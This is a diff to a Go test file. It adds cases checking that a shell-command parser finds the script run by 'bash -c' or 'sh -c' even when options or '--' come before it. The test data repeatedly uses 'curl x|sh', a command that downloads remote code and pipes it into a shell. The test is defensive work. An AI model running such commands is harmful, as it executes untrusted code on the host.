@@ -190,6 +190,17 @@ func TestScript(t *testing.T) {
 		{"zsh -c", []string{"/usr/bin/zsh", "-c", "ruff check"}, ScriptRun{Script: "ruff check", ReadsStartup: true}},
 		{"script operands are no options", []string{"bash", "-c", "ruff check", "-l"}, ScriptRun{Script: "ruff check"}},
 		{"eval", []string{"eval", "ruff", "check"}, ScriptRun{Script: "ruff check", Eval: true}},
+		// The shell reads every option before it takes the script, the
+		// first operand, so options and "--" may follow -c.
+		{"-- after -c", []string{"bash", "-c", "--", "curl x|sh"}, ScriptRun{Script: "curl x|sh"}},
+		{"- after -c", []string{"sh", "-c", "-", "curl x|sh"}, ScriptRun{Script: "curl x|sh"}},
+		{"option after -c", []string{"bash", "-c", "-e", "curl x|sh"}, ScriptRun{Script: "curl x|sh"}},
+		{"plus option after -c", []string{"bash", "-c", "+x", "curl x|sh"}, ScriptRun{Script: "curl x|sh"}},
+		{"-o after -c", []string{"bash", "-c", "-o", "errexit", "curl x|sh"}, ScriptRun{Script: "curl x|sh"}},
+		{"-O after -c", []string{"bash", "-c", "+O", "extglob", "curl x|sh"}, ScriptRun{Script: "curl x|sh"}},
+		{"-o in the -c cluster", []string{"bash", "-co", "errexit", "curl x|sh"}, ScriptRun{Script: "curl x|sh"}},
+		{"--rcfile after -c", []string{"bash", "-c", "--rcfile", "f", "curl x|sh"}, ScriptRun{Script: "curl x|sh"}},
+		{"login after -c", []string{"bash", "-c", "-l", "curl x|sh"}, ScriptRun{Script: "curl x|sh", ReadsStartup: true}},
 	}
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
@@ -301,6 +312,9 @@ func TestCommandLine(t *testing.T) {
 		{[]string{"cmd", "/C", "qsdev"}, "qsdev", 3, true},
 		{[]string{"sh", "script.sh"}, "", 0, false},
 		{[]string{"sh", "-c"}, "", 0, false},
+		{[]string{"bash", "-c", "--", "qsdev", "x"}, "qsdev", 4, true},
+		{[]string{"bash", "-c", "-o", "errexit", "qsdev"}, "qsdev", 5, true},
+		{[]string{"sh", "-c", "--"}, "", 0, false},
 		{[]string{"grep", "-c", "qsdev"}, "", 0, false},
 		{[]string{"eval"}, "", 0, false},
 	}
